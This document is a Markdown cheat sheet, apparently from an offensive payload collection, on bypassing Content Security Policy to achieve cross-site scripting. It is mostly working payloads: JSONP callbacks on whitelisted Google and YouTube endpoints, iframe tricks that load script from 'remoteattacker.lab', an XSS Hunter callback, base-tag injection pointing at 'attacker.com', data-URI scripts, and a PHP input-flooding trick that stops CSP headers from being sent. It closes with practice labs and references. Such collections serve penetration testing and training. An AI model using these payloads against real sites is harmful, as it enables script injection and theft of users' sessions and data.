# CSP Bypass

> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.


## Summary

- [CSP Detection](#csp-detection)
- [Bypass CSP using JSONP](#bypass-csp-using-jsonp)
- [Bypass CSP default-src](#bypass-csp-default-src)
- [Bypass CSP inline eval](#bypass-csp-inline-eval)
- [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
- [Bypass CSP script-src self](#bypass-csp-script-src-self)
- [Bypass CSP script-src data](#bypass-csp-script-src-data)
- [Bypass CSP nonce](#bypass-csp-nonce)
- [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)
- [Labs](#labs)
- [References](#references)


## CSP Detection

Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)


## Bypass CSP using JSONP

**Requirements**:

* CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

**Payload**:

Use a callback function from a whitelisted source listed in the CSP.

* Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
* Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
* Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
* Youtube: `https://www.youtube.com/oembed?callback=alert;`
* [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```


## Bypass CSP default-src

**Requirements**:

* CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, 

**Payload**:

`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`

```js
script=document.createElement('script');
script.src='//remoteattacker.lab/csp.js';
window.frames[0].document.head.appendChild(script);
```

Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)


## Bypass CSP inline eval 

**Requirements**:

* CSP `inline` or `eval`


**Payload**:

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)


## Bypass CSP script-src self 

**Requirements**:

* CSP like `script-src self`

**Payload**:

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Source: [@akita_zen](https://twitter.com/akita_zen)


## Bypass CSP script-src data

**Requirements**:

* CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).


**Payload**:

```javascript
<script src="data:,alert(1)">/</script>
```

Source: [@404death](https://twitter.com/404death/status/1191222237782659072)


## Bypass CSP unsafe-inline

**Requirements**:

* CSP: `script-src https://google.com 'unsafe-inline';`

**Payload**:

```javascript
"/><script>alert(1);</script>
```


## Bypass CSP nonce

**Requirements**:

* CSP like `script-src 'nonce-RANDOM_NONCE'`
* Imported JS file with a relative link: `<script src='/PATH.js'></script>`


**Payload**:

1. Inject a base tag.
  ```html
  <base href=http://www.attacker.com>
  ```
2. Host your custom js file at the same path that one of the website's script.
  ```
  http://www.attacker.com/PATH.js
  ```


## Bypass CSP header sent by PHP

**Requirements**:

* CSP sent by PHP `header()` function 


**Payload**:

In default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.

Here are several ways to generate a warning:

- 1000 $_GET parameters
- 1000 $_POST parameters
- 20 $_FILES

If the **Warning** are configured to be displayed you should get these:

* **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
* **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`


```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
```

Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)


## Labs

* [Root Me - CSP Bypass - Inline Code](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
* [Root Me - CSP Bypass - Nonce](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
* [Root Me - CSP Bypass - Nonce 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce-2)
* [Root Me - CSP Bypass - Dangling Markup](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)
* [Root Me - CSP Bypass - Dangling Markup 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)
* [Root Me - CSP Bypass - JSONP](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)


## References

- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)
- [D1T1 - So We Broke All CSPs - Michele Spagnuolo and Lukas Weichselbaum - 27 Jun 2017](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [Making an XSS triggered by CSP bypass on Twitter - wiki.ioin.in(查看原文) - 2020-04-06](https://www.buaq.net/go-25883.html)